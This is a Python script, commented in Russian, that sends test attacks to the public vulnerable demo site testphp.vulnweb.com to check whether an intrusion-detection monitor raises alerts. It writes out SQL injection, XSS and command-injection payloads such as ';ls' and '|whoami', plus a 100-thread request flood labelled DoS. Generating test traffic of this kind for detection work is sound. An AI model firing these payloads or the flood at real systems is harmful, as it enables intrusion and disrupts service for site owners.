#!/usr/bin/env python3
"""
Тестовые атаки для проверки системы обнаружения
Запускать из отдельного терминала
"""

import requests
import threading
import time

TARGET_URL = "http://testphp.vulnweb.com"

def test_sql_injection():
    """Тест SQL-инъекции"""
    print("[TEST] Запуск SQL-инъекции...")
    payloads = [
        "artists.php?artist=1' OR '1'='1",
        "artists.php?artist=1' UNION SELECT null,version()--",
        "product.php?pid=1' AND 1=1--",
    ]
    for payload in payloads:
        url = f"{TARGET_URL}/{payload}"
        try:
            r = requests.get(url, timeout=2)
            print(f"  → {payload[:50]}... status: {r.status_code}")
        except:
            pass
    print("[TEST] SQL-инъекция завершена")

def test_xss():
    """Тест XSS"""
    print("[TEST] Запуск XSS...")
    payloads = [
        "search.php?search=<script>alert(1)</script>",
        "search.php?search=<img src=x onerror=alert(1)>",
        "search.php?search=javascript:alert(1)",
    ]
    for payload in payloads:
        url = f"{TARGET_URL}/{payload}"
        try:
            r = requests.get(url, timeout=2)
            print(f"  → {payload[:50]}... status: {r.status_code}")
        except:
            pass
    print("[TEST] XSS завершён")

def test_dos():
    """Тест DoS (много запросов)"""
    print("[TEST] Запуск DoS (100 запросов за 2 секунды)...")
    
    def make_request():
        try:
            requests.get(f"{TARGET_URL}/", timeout=1)
        except:
            pass
    
    threads = []
    for i in range(100):
        t = threading.Thread(target=make_request)
        t.start()
        threads.append(t)
    
    for t in threads:
        t.join()
    
    print("[TEST] DoS завершён")

def test_command_injection():
    """Тест командной инъекции"""
    print("[TEST] Запуск Command Injection...")
    payloads = [
        "?cmd=;ls",
        "?cmd=|whoami",
        "?cmd=`id`",
    ]
    for payload in payloads:
        url = f"{TARGET_URL}/{payload}"
        try:
            r = requests.get(url, timeout=2)
            print(f"  → {payload}... status: {r.status_code}")
        except:
            pass
    print("[TEST] Command Injection завершён")

if __name__ == "__main__":
    print("="*50)
    print("Запуск тестовых атак против DarkTrace Light")
    print("Убедитесь, что программа мониторинга запущена!")
    print("="*50)
    
    time.sleep(2)
    
    test_sql_injection()
    time.sleep(1)
    test_xss()
    time.sleep(1)
    test_command_injection()
    time.sleep(1)
    test_dos()
    
    print("\n[TEST] Все тесты завершены. Проверьте алерты в программе.")